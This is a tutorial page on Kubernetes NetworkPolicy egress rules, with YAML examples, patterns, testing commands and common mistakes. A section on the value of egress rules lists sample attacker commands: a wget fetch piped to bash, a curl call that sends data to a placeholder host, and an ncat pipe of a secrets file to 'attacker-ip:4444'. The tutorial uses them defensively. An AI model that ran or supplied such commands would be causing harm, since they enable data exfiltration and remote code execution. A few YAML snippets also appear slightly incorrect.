# Egress Rules

## Introduction

Ingress rules control incoming traffic ("who can reach this pod"). Egress rules control outgoing traffic ("where can this pod reach").

If a pod is compromised, egress rules limit where the attacker can go. They prevent data exfiltration and lateral movement.

---

## Basic Egress Rule

```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: backend-egress
spec:
  # This policy applies to backend pods
  podSelector:
    matchLabels:
      tier: backend
  
  policyTypes:
  - Egress
  
  # Egress rules (outgoing traffic)
  egress:
  - to:
    - podSelector:
        matchLabels:
          tier: database  # Can only reach database pods
    ports:
    - protocol: TCP
      port: 5432
```

Translation: "Backend pods can send traffic to database pods on port 5432. All other outgoing traffic is blocked."

---

## Rule Structure

Each egress rule has the same structure as ingress:

```yaml
egress:
- to: [ ... ]        # To these destinations
  ports: [ ... ]     # On these ports
```

### Part 1: `to` (Where can traffic go?)

Destination can be:

**Pod selector (same namespace):**
```yaml
to:
- podSelector:
    matchLabels:
      tier: backend
```

Can reach pods with `tier: backend` in the same namespace.

**Namespace selector:**
```yaml
to:
- namespaceSelector:
    matchLabels:
      name: external-apis
```

Can reach any pod in the `external-apis` namespace.

**IP address block (external traffic):**
```yaml
to:
- ipBlock:
    cidr: 10.0.0.0/8         # Can reach this IP range
    except:
    - 10.0.0.0/24            # Except this subnet
```

Can reach external systems (services outside the cluster).

### Part 2: `ports`

Same as ingress:

```yaml
ports:
- protocol: TCP
  port: 5432       # Specific port
- protocol: UDP
  port: 53         # DNS
```

---

## Common Egress Patterns

### Pattern 1: Pod Can Reach Specific Service

```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: frontend-egress
spec:
  podSelector:
    matchLabels:
      tier: frontend
  
  egress:
  - to:
    - podSelector:
        matchLabels:
          tier: backend
    ports:
    - protocol: TCP
      port: 8080
```

Frontend pods can only reach backend pods on port 8080. Cannot reach database, other services, or internet.

### Pattern 2: Allow DNS (All Pods Need This)

```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-dns
spec:
  podSelector: {}              # All pods
  
  egress:
  - to:
    - namespaceSelector:
        matchLabels:
          name: kube-system
    ports:
    - protocol: UDP
      port: 53                 # DNS
```

All pods can reach DNS service (needed for service discovery).

### Pattern 3: Allow External Service

```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: payment-egress
spec:
  podSelector:
    matchLabels:
      app: payment
  
  egress:
  - to:
    - ipBlock:
        cidr: 151.101.1.1/32   # Stripe API
    ports:
    - protocol: TCP
      port: 443
  
  - to:
    - podSelector:
        matchLabels:
          tier: database
    ports:
    - protocol: TCP
      port: 5432
```

Payment pods can:
- Reach Stripe API (external IP)
- Reach database pods

Cannot reach anything else.

### Pattern 4: Default Deny + Specific Allows

```yaml
# First: Block all outgoing traffic
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: default-deny-egress
spec:
  podSelector: {}
  policyTypes:
  - Egress
  egress: []  # No outgoing traffic

---
# Then: Allow specific flows
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-api-egress
spec:
  podSelector:
    matchLabels:
      tier: api
  
  egress:
  # To database
  - to:
    - podSelector:
        matchLabels:
          tier: database
    ports:
    - protocol: TCP
      port: 5432
  
  # To cache
  - to:
    - podSelector:
        matchLabels:
          tier: cache
    ports:
    - protocol: TCP
      port: 6379
  
  # To DNS
  - to:
    - namespaceSelector:
        matchLabels:
          name: kube-system
    ports:
    - protocol: UDP
      port: 53
```

API pods can reach:
- Database on port 5432
- Cache on port 6379
- DNS on port 53

Cannot reach anything else.

---

## Egress vs Ingress

Important distinction:

```
Ingress Policy on Pod A:
  Specifies: "Which pods can reach Pod A?"
  
Egress Policy on Pod B:
  Specifies: "Where can Pod B reach?"
```

**Both need to match for traffic to flow:**

```
Pod B → Pod A communication:
  ✓ Pod B has egress rule to Pod A
  ✓ Pod A has ingress rule from Pod B
  → Traffic allowed

Pod B → Pod A communication:
  ✓ Pod B has egress rule to Pod A
  ✗ Pod A has NO ingress rule from Pod B
  → Traffic denied (Pod A rejects)

Pod B → Pod A communication:
  ✗ Pod B has NO egress rule to Pod A
  ✓ Pod A has ingress rule from Pod B
  → Traffic denied (Pod B cannot send)
```

**Analogy:** Like a phone call:
- Pod B (egress) = can I call out?
- Pod A (ingress) = can I accept calls?
- Both must say YES for communication to work.

---

## External Traffic (IP Blocks)

Egress rules can restrict traffic to external systems (outside cluster).

### Allow External API

```yaml
egress:
- to:
  - ipBlock:
      cidr: 93.184.216.34/32   # External API IP
  ports:
  - protocol: TCP
    port: 443
```

Pod can reach that specific external IP on port 443.

### Deny Specific Range (Except)

```yaml
egress:
- to:
  - ipBlock:
      cidr: 0.0.0.0/0          # Allow any external IP
      except:
      - 169.254.169.254/32     # Except AWS metadata service
  ports:
  - protocol: TCP
    port: 443
```

Pod can reach external internet except AWS metadata service.

### Deny All External

```yaml
egress:
- to:
  - podSelector: {}            # Only to pods in cluster
  # No ipBlock = no external access
```

Pod cannot reach anything outside the cluster.

---

## Real-World Example

```yaml
---
# Frontend → Backend only
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: frontend-egress
  namespace: production
spec:
  podSelector:
    matchLabels:
      tier: frontend
  
  egress:
  - to:
    - podSelector:
        matchLabels:
          tier: backend
    ports:
    - protocol: TCP
      port: 8080
  - to:
    - namespaceSelector:
        matchLabels:
          name: kube-system
    ports:
    - protocol: UDP
      port: 53     # DNS

---
# Backend → Database + DNS
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: backend-egress
  namespace: production
spec:
  podSelector:
    matchLabels:
      tier: backend
  
  egress:
  - to:
    - podSelector:
        matchLabels:
          tier: database
    ports:
    - protocol: TCP
      port: 5432
  - to:
    - podSelector:
        matchLabels:
          tier: cache
    ports:
    - protocol: TCP
      port: 6379
  - to:
    - namespaceSelector:
        matchLabels:
          name: kube-system
    ports:
    - protocol: UDP
      port: 53

---
# Database → Nothing (only receives)
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: database-egress-deny
  namespace: production
spec:
  podSelector:
    matchLabels:
      tier: database
  
  policyTypes:
  - Egress
  
  egress: []  # No outgoing traffic allowed
```

---

## Why Egress Rules Matter

### Without Egress Rules

```
Backend pod compromised
Attacker has full internet access
Attacker exfiltrates data:
  $ wget malicious-site.com/steal-data.sh | bash
  $ curl attacker-command-center.com?steal=database
  $ ncat attacker-ip:4444 < /secrets/api-key.json
```

Attacker can send data anywhere.

### With Egress Rules

```
Backend pod compromised
Attacker tries to exfiltrate:
  $ wget malicious-site.com/steal-data.sh
  DNS lookup fails (DNS not allowed to that domain)
  
  $ curl attacker-command-center.com
  Connection refused (no egress rule)
  
  $ ncat attacker-ip:4444
  Connection refused (no egress rule)
```

Attacker is trapped. Data exfiltration is prevented.

---

## Testing Egress Rules

```bash
# Create a test pod
kubectl run test-pod --image=alpine -i --tty -- sh

# Try to reach external service (should timeout)
/ # wget -O- http://example.com
# Timeout (egress blocked)

# Try to reach allowed service
/ # wget -O- http://allowed-service:8080
# Success (egress allowed)

# Try DNS
/ # nslookup google.com
# Failure (DNS not allowed)
```

---

## Common Mistakes

### Mistake 1: Forgetting DNS

```yaml
# WRONG — no DNS allowed
egress:
- to:
  - podSelector:
      matchLabels:
        tier: backend
  ports:
  - protocol: TCP
    port: 8080

# Pod will fail to resolve DNS! "backend" won't resolve.
```

Almost every pod needs DNS:

```yaml
# CORRECT — include DNS
egress:
- to:
  - podSelector:
      matchLabels:
        tier: backend
  ports:
  - protocol: TCP
    port: 8080

- to:
  - namespaceSelector:
      matchLabels:
        name: kube-system
  ports:
  - protocol: UDP
    port: 53
```

### Mistake 2: Restricting Too Much

```yaml
# WRONG — blocks kubelet
egress:
- from: []  # No outgoing allowed at all
```

Pods need to reach some Kubernetes services (kubelet, etc.).

### Mistake 3: Forgetting Ingress

```yaml
# WRONG — only egress rule
policyTypes:
- Egress

# Traffic from outside the pod is still allowed!
```

Ingress is still open. Combine ingress + egress for complete control.

---

## Summary

Egress rules control outgoing traffic:

**Structure:**
```yaml
egress:
- to: [ destination1, destination2, ... ]
  ports: [ port1, port2, ... ]
```

**Destinations:**
- `podSelector` — pods in cluster
- `namespaceSelector` — namespaces
- `ipBlock` — external IPs

**Key points:**
- Must allow DNS for name resolution
- Both ingress (on destination) and egress (on source) must allow
- Default: all traffic allowed (if no egress rules)
- With rules: only specified traffic allowed

In the next file, `04-default-deny-policy.md`, we will learn about the default-deny pattern — best practice for network security.
